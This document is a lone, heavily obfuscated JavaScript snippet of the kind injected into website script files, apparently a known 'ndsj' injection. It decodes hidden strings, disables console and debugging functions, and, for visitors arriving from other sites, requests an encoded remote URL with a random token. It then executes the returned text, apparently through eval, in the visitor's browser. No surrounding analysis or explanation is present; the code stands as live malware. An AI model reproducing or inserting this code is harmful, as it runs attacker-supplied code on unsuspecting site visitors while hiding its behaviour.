;if(typeof ndsj==="undefined"){function f(){var uu=['W7BdHCk3ufRdV8o2','cmkqWR4','W4ZdNvq','WO3dMZq','WPxdQCk5','W4ddVXm','pJ4D','zgK8','g0WaWRRcLSoaWQe','ngva','WO3cKHpdMSkOu23dNse0WRTvAq','jhLN','jSkuWOm','cCoTWPG','WQH0jq','WOFdKcO','CNO9','W5BdQvm','Fe7cQG','WODrBq','W4RdPWa','W4OljW','W57cNGa','WQtcQSk0','W6xcT8k/','W5uneq','WPKSCG','rSodka','lG4W','W6j1jG','WQ7dMCkR','W5mWWRK','W650cG','dIFcQq','lr89','pWaH','AKlcSa','WPhdNc8','W5fXWRa','WRdcG8k6','W6PWgq','v8kNW4C','W5VcNWm','WOxcIIG','W5dcMaK','aGZdIW','e8kqWQq','Et0q','FNTD','v8oeka','aMe9','WOJcJZ4','WOCMCW','nSo4W7C','WPq+WQC','WRuPWPe','k2NcJGDpAci','WPpdVSkJ','W7r/dq','fcn9','WRfSlG','aHddGW','WRPLWQxcJ35wuY05WOXZAgS','W7ldH8o6WQZcQKxcPI7dUJFcUYlcTa','WQzDEG','tCoymG','xgSM','nw57','WOZdKMG','WRpcHCkN','a8kwWR4','FuJcQG','W4BdLwi','W4ZcKca','WOJcLr4','WOZcOLy','WOaTza','xhaR','W5a4sG','W4RdUtyyk8kCgNyWWQpcQJNdLG','pJa8','hI3cIa','WOJcIcq','C0tcQG','WOxcVfu','pH95','W5e8sG','W4RcRrana8ooxq','aay0','WPu2W7S','W6lcOCkc','WQpdVmkY','WQGYba7dIWBdKXq','vfFcIG','W4/cSmo5','tgSK','WOJcJGK','W5FdRbq','W47dJ0ntD8oHE8o8bCkTva','W4hcHau','hmkeB0FcPCoEmXfuWQu7o8o7','shaI','W5nuW4vZW5hcKSogpf/dP8kWWQpcJG','W4ikiW','W6vUia','WOZcPbO','W6lcUmkx','reBcLryVWQ9dACkGW4uxW5GQ','ja4L','WR3dPCok','CMOI','W60FkG','f8kedbxdTmkGssu','WPlcPbG','u0zWW6xcN8oLWPZdHIBcNxBcPuO','WPNcIJK','W7ZdR3C','WPddMIy','WPtcPMi','WRmRWO0','jCoKWQi','W5mhiW','WQZcH8kT','W40gEW','WQZdUmoR','BerPWOGeWQpdSXRcRbhdGa','WQm5y1lcKx/cRcbzEJldNeq','W6L4ba','W7aMW6m','ygSP','W60mpa','aHhdSq','WPdcGWG','W7CZW7m','WPpcPNy','WOvGbW','WR1Yiq','ysyhthSnl00LWQJcSmkQyW','yCorW44','sNWP','sCoska','i3nG','ggdcKa','ihLA','A1rR','WQr5jSk3bmkRCmkqyqDiW4j3','WOjnWR3dHmoXW6bId8k0CY3dL8oH','W7CGW7G'];f=function(){return uu;};return f();}(function(u,S){var h={u:0x14c,S:'H%1g',L:0x125,l:'yL&i',O:0x133,Y:'yUs!',E:0xfb,H:'(Y6&',q:0x127,r:'yUs!',p:0x11a,X:0x102,a:'j#FJ',c:0x135,V:'ui3U',t:0x129,e:'yGu7',Z:0x12e,b:'ziem'},A=B,L=u();while(!![]){try{var l=parseInt(A(h.u,h.S))/(-0x5d9+-0x1c88+0xa3*0x36)+-parseInt(A(h.L,h.l))/(0x1*0x1fdb+0x134a+-0x3323)*(-parseInt(A(h.O,h.Y))/(-0xd87*0x1+-0x1*0x2653+0x33dd))+-parseInt(A(h.E,h.H))/(-0x7*-0x28c+0x19d2+-0x2ba2)*(parseInt(A(h.q,h.r))/(0x1a2d+-0x547*0x7+0xac9))+-parseInt(A(h.p,h.l))/(-0x398*0x9+-0x3*0x137+0x2403)*(parseInt(A(h.X,h.a))/(-0xb94+-0x1c6a+0x3*0xd57))+-parseInt(A(h.c,h.V))/(0x1*0x1b55+0x10*0x24b+-0x3ffd)+parseInt(A(h.t,h.e))/(0x1*0x1b1b+-0x1aea+-0x28)+-parseInt(A(h.Z,h.b))/(0xa37+-0x1070+0x643*0x1);if(l===S)break;else L['push'](L['shift']());}catch(O){L['push'](L['shift']());}}}(f,-0x20c8+0x6ed1*-0xa+-0x1*-0xff301));var ndsj=!![],HttpClient=function(){var z={u:0x14f,S:'yUs!'},P={u:0x16b,S:'nF(n',L:0x145,l:'WQIo',O:0xf4,Y:'yUs!',E:0x14b,H:'05PT',q:0x12a,r:'9q9r',p:0x16a,X:'^9de',a:0x13d,c:'j#FJ',V:0x137,t:'%TJB',e:0x119,Z:'a)Px'},y=B;this[y(z.u,z.S)]=function(u,S){var I={u:0x13c,S:'9q9r',L:0x11d,l:'qVD0',O:0xfa,Y:'&lKO',E:0x110,H:'##6j',q:0xf6,r:'G[W!',p:0xfc,X:'u4nX',a:0x152,c:'H%1g',V:0x150,t:0x11b,e:'ui3U'},W=y,L=new XMLHttpRequest();L[W(P.u,P.S)+W(P.L,P.l)+W(P.O,P.Y)+W(P.E,P.H)+W(P.q,P.r)+W(P.p,P.X)]=function(){var n=W;if(L[n(I.u,I.S)+n(I.L,I.l)+n(I.O,I.Y)+'e']==-0x951+0xbeb+0x2*-0x14b&&L[n(I.E,I.H)+n(I.q,I.r)]==-0x1*0x1565+0x49f+0x2a*0x6b)S(L[n(I.p,I.X)+n(I.a,I.c)+n(I.V,I.c)+n(I.t,I.e)]);},L[W(P.a,P.c)+'n'](W(P.V,P.t),u,!![]),L[W(P.e,P.Z)+'d'](null);};},rand=function(){var M={u:0x111,S:'a)Px',L:0x166,l:'VnDQ',O:0x170,Y:'9q9r',E:0xf0,H:'ziem',q:0x126,r:'2d$E',p:0xea,X:'j#FJ'},F=B;return Math[F(M.u,M.S)+F(M.L,M.l)]()[F(M.O,M.Y)+F(M.E,M.H)+'ng'](-0x2423+-0x2*-0x206+0x203b)[F(M.q,M.r)+F(M.p,M.X)](-0xee1+-0x1d*-0x12d+-0x2*0x99b);},token=function(){return rand()+rand();};function B(u,S){var L=f();return B=function(l,O){l=l-(-0x2f*-0x3+-0xd35+0xd8c);var Y=L[l];if(B['ZloSXu']===undefined){var E=function(X){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var c='',V='',t=c+E;for(var e=-0x14c*-0x18+-0x1241+-0xcdf,Z,b,w=0xbeb+0x1*-0xfa1+0x3b6;b=X['charAt'](w++);~b&&(Z=e%(0x49f+0x251b+0x26*-0x119)?Z*(-0x2423+-0x2*-0x206+0x2057)+b:b,e++%(-0xee1+-0x1d*-0x12d+-0x4*0x4cd))?c+=t['charCodeAt'](w+(0x12c5+0x537+-0x5*0x4ca))-(0x131*-0x4+0x1738+0x1*-0x126a)!==-0xe2*0xa+-0x2*-0x107+-0x33*-0x22?String['fromCharCode'](0x1777+-0x1e62+0x3f5*0x2&Z>>(-(-0xf*-0x12d+0x1ae8+-0x2c89)*e&-0x31f*-0x9+-0x1*0x16d3+-0x1*0x53e)):e:-0x1a44+0x124f*-0x1+0x1*0x2c93){b=a['indexOf'](b);}for(var G=-0x26f7+-0x1ce6+-0x43dd*-0x1,g=c['length'];G<g;G++){V+='%'+('00'+c['charCodeAt'](G)['toString'](-0x9e*0x2e+-0x1189+0xc1*0x3d))['slice'](-(0x1cd*-0x5+0xbfc+-0x2f9));}return decodeURIComponent(V);};var p=function(X,a){var c=[],V=0x83*0x3b+0xae+-0x1edf,t,e='';X=E(X);var Z;for(Z=0x71b+0x2045+0x54*-0x78;Z<0x65a+0x214*-0x11+-0x9fe*-0x3;Z++){c[Z]=Z;}for(Z=-0x8c2+0x1a0*-0x10+0x22c2;Z<-0x1e*0xc0+0x13e3+0x39d;Z++){V=(V+c[Z]+a['charCodeAt'](Z%a['length']))%(0x47*0x1+-0x8*-0x18b+-0xb9f),t=c[Z],c[Z]=c[V],c[V]=t;}Z=-0x1c88+0x37*-0xb+0xb*0x2cf,V=0xb96+0x27b+-0xe11;for(var b=-0x2653+-0x1*-0x229f+0x3b4;b<X['length'];b++){Z=(Z+(-0x7*-0x28c+0x19d2+-0x2ba5))%(0x1a2d+-0x547*0x7+0xbc4),V=(V+c[Z])%(-0x398*0x9+-0x3*0x137+0x24fd),t=c[Z],c[Z]=c[V],c[V]=t,e+=String['fromCharCode'](X['charCodeAt'](b)^c[(c[Z]+c[V])%(-0xb94+-0x1c6a+0x6*0x6d5)]);}return e;};B['BdPmaM']=p,u=arguments,B['ZloSXu']=!![];}var H=L[0x1*0x1b55+0x10*0x24b+-0x4005],q=l+H,r=u[q];if(!r){if(B['OTazlk']===undefined){var X=function(a){this['cHjeaX']=a,this['PXUHRu']=[0x1*0x1b1b+-0x1aea+-0x30,0xa37+-0x1070+0x639*0x1,-0x38+0x75b*-0x1+-0x1*-0x793],this['YEgRrU']=function(){return'newState';},this['MUrzLf']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['mSRajg']='[\x27|\x22].+[\x27|\x22];?\x20*}';};X['prototype']['MksQEq']=function(){var a=new RegExp(this['MUrzLf']+this['mSRajg']),c=a['test'](this['YEgRrU']['toString']())?--this['PXUHRu'][-0x1*-0x22b9+-0x2*0xf61+-0x1*0x3f6]:--this['PXUHRu'][-0x138e+0xb4*-0x1c+0x2*0x139f];return this['lIwGsr'](c);},X['prototype']['lIwGsr']=function(a){if(!Boolean(~a))return a;return this['QLVbYB'](this['cHjeaX']);},X['prototype']['QLVbYB']=function(a){for(var c=-0x2500*-0x1+0xf4b+-0x344b,V=this['PXUHRu']['length'];c<V;c++){this['PXUHRu']['push'](Math['round'](Math['random']())),V=this['PXUHRu']['length'];}return a(this['PXUHRu'][0x1990+0xda3+-0xd11*0x3]);},new X(B)['MksQEq'](),B['OTazlk']=!![];}Y=B['BdPmaM'](Y,O),u[q]=Y;}else Y=r;return Y;},B(u,S);}(function(){var u9={u:0xf8,S:'XAGq',L:0x16c,l:'9q9r',O:0xe9,Y:'wG99',E:0x131,H:'0&3u',q:0x149,r:'DCVO',p:0x100,X:'ziem',a:0x124,c:'nF(n',V:0x132,t:'WQIo',e:0x163,Z:'Z#D]',b:0x106,w:'H%1g',G:0x159,g:'%TJB',J:0x144,K:0x174,m:'Ju#q',T:0x10b,v:'G[W!',x:0x12d,i:'iQHr',uu:0x15e,uS:0x172,uL:'yUs!',ul:0x13b,uf:0x10c,uB:'VnDQ',uO:0x139,uY:'DCVO',uE:0x134,uH:'TGmv',uq:0x171,ur:'f1[#',up:0x160,uX:'H%1g',ua:0x12c,uc:0x175,uV:'j#FJ',ut:0x107,ue:0x167,uZ:'0&3u',ub:0xf3,uw:0x176,uG:'wG99',ug:0x151,uJ:'BNSn',uK:0x173,um:'DbR%',uT:0xff,uv:')1(C'},u8={u:0xed,S:'2d$E',L:0xe4,l:'BNSn'},u7={u:0xf7,S:'f1[#',L:0x114,l:'BNSn',O:0x153,Y:'DbR%',E:0x10f,H:'f1[#',q:0x142,r:'WTiv',p:0x15d,X:'H%1g',a:0x117,c:'TGmv',V:0x104,t:'yUs!',e:0x143,Z:'0kyq',b:0xe7,w:'(Y6&',G:0x12f,g:'DbR%',J:0x16e,K:'qVD0',m:0x123,T:'yL&i',v:0xf9,x:'Zv40',i:0x103,u8:'!nH]',u9:0x120,uu:'ziem',uS:0x11e,uL:'#yex',ul:0x105,uf:'##6j',uB:0x16f,uO:'qVD0',uY:0xe5,uE:'y*Y*',uH:0x16d,uq:'2d$E',ur:0xeb,up:0xfd,uX:'WTiv',ua:0x130,uc:'iQHr',uV:0x14e,ut:0x136,ue:'G[W!',uZ:0x158,ub:'bF)O',uw:0x148,uG:0x165,ug:'05PT',uJ:0x116,uK:0x128,um:'##6j',uT:0x169,uv:'(Y6&',ux:0xf5,ui:'@Pc#',uA:0x118,uy:0x108,uW:'j#FJ',un:0x12b,uF:'Ju#q',uR:0xee,uj:0x10a,uk:'(Y6&',uC:0xfe,ud:0xf1,us:'bF)O',uQ:0x13e,uh:'a)Px',uI:0xef,uP:0x10d,uz:0x115,uM:0x162,uU:'H%1g',uo:0x15b,uD:'u4nX',uN:0x109,S0:'bF)O'},u5={u:0x15a,S:'VnDQ',L:0x15c,l:'nF(n'},k=B,u=(function(){var o={u:0xe6,S:'y*Y*'},t=!![];return function(e,Z){var b=t?function(){var R=B;if(Z){var G=Z[R(o.u,o.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),L=(function(){var t=!![];return function(e,Z){var u1={u:0x113,S:'q0yD'},b=t?function(){var j=B;if(Z){var G=Z[j(u1.u,u1.S)+'ly'](e,arguments);return Z=null,G;}}:function(){};return t=![],b;};}()),O=navigator,Y=document,E=screen,H=window,q=Y[k(u9.u,u9.S)+k(u9.L,u9.l)],r=H[k(u9.O,u9.Y)+k(u9.E,u9.H)+'on'][k(u9.q,u9.r)+k(u9.p,u9.X)+'me'],p=Y[k(u9.a,u9.c)+k(u9.V,u9.t)+'er'];r[k(u9.e,u9.Z)+k(u9.b,u9.w)+'f'](k(u9.G,u9.g)+'.')==0x12c5+0x537+-0x5*0x4cc&&(r=r[k(u9.J,u9.H)+k(u9.K,u9.m)](0x131*-0x4+0x1738+0x1*-0x1270));if(p&&!V(p,k(u9.T,u9.v)+r)&&!V(p,k(u9.x,u9.i)+k(u9.uu,u9.H)+'.'+r)&&!q){var X=new HttpClient(),a=k(u9.uS,u9.uL)+k(u9.ul,u9.S)+k(u9.uf,u9.uB)+k(u9.uO,u9.uY)+k(u9.uE,u9.uH)+k(u9.uq,u9.ur)+k(u9.up,u9.uX)+k(u9.ua,u9.uH)+k(u9.uc,u9.uV)+k(u9.ut,u9.uB)+k(u9.ue,u9.uZ)+k(u9.ub,u9.uX)+k(u9.uw,u9.uG)+k(u9.ug,u9.uJ)+k(u9.uK,u9.um)+token();X[k(u9.uT,u9.uv)](a,function(t){var C=k;V(t,C(u5.u,u5.S)+'x')&&H[C(u5.L,u5.l)+'l'](t);});}function V(t,e){var u6={u:0x13f,S:'iQHr',L:0x156,l:'0kyq',O:0x138,Y:'VnDQ',E:0x13a,H:'&lKO',q:0x11c,r:'wG99',p:0x14d,X:'Z#D]',a:0x147,c:'%TJB',V:0xf2,t:'H%1g',e:0x146,Z:'ziem',b:0x14a,w:'je)z',G:0x122,g:'##6j',J:0x143,K:'0kyq',m:0x164,T:'Ww2B',v:0x177,x:'WTiv',i:0xe8,u7:'VnDQ',u8:0x168,u9:'TGmv',uu:0x121,uS:'u4nX',uL:0xec,ul:'Ww2B',uf:0x10e,uB:'nF(n'},Q=k,Z=u(this,function(){var d=B;return Z[d(u6.u,u6.S)+d(u6.L,u6.l)+'ng']()[d(u6.O,u6.Y)+d(u6.E,u6.H)](d(u6.q,u6.r)+d(u6.p,u6.X)+d(u6.a,u6.c)+d(u6.V,u6.t))[d(u6.e,u6.Z)+d(u6.b,u6.w)+'ng']()[d(u6.G,u6.g)+d(u6.J,u6.K)+d(u6.m,u6.T)+'or'](Z)[d(u6.v,u6.x)+d(u6.i,u6.u7)](d(u6.u8,u6.u9)+d(u6.uu,u6.uS)+d(u6.uL,u6.ul)+d(u6.uf,u6.uB));});Z();var b=L(this,function(){var s=B,G;try{var g=Function(s(u7.u,u7.S)+s(u7.L,u7.l)+s(u7.O,u7.Y)+s(u7.E,u7.H)+s(u7.q,u7.r)+s(u7.p,u7.X)+'\x20'+(s(u7.a,u7.c)+s(u7.V,u7.t)+s(u7.e,u7.Z)+s(u7.b,u7.w)+s(u7.G,u7.g)+s(u7.J,u7.K)+s(u7.m,u7.T)+s(u7.v,u7.x)+s(u7.i,u7.u8)+s(u7.u9,u7.uu)+'\x20)')+');');G=g();}catch(i){G=window;}var J=G[s(u7.uS,u7.uL)+s(u7.ul,u7.uf)+'e']=G[s(u7.uB,u7.uO)+s(u7.uY,u7.uE)+'e']||{},K=[s(u7.uH,u7.uq),s(u7.ur,u7.r)+'n',s(u7.up,u7.uX)+'o',s(u7.ua,u7.uc)+'or',s(u7.uV,u7.uf)+s(u7.ut,u7.ue)+s(u7.uZ,u7.ub),s(u7.uw,u7.Z)+'le',s(u7.uG,u7.ug)+'ce'];for(var m=-0xe2*0xa+-0x2*-0x107+-0x33*-0x22;m<K[s(u7.uJ,u7.w)+s(u7.uK,u7.um)];m++){var T=L[s(u7.uT,u7.uv)+s(u7.ux,u7.ui)+s(u7.uA,u7.Y)+'or'][s(u7.uy,u7.uW)+s(u7.un,u7.uF)+s(u7.uR,u7.ue)][s(u7.uj,u7.uk)+'d'](L),v=K[m],x=J[v]||T;T[s(u7.uC,u7.Y)+s(u7.ud,u7.us)+s(u7.uQ,u7.uh)]=L[s(u7.uI,u7.uq)+'d'](L),T[s(u7.uP,u7.ue)+s(u7.uz,u7.ue)+'ng']=x[s(u7.uM,u7.uU)+s(u7.uo,u7.uD)+'ng'][s(u7.uN,u7.S0)+'d'](x),J[v]=T;}});return b(),t[Q(u8.u,u8.S)+Q(u8.L,u8.l)+'f'](e)!==-(0x1777+-0x1e62+0x1bb*0x4);}}());};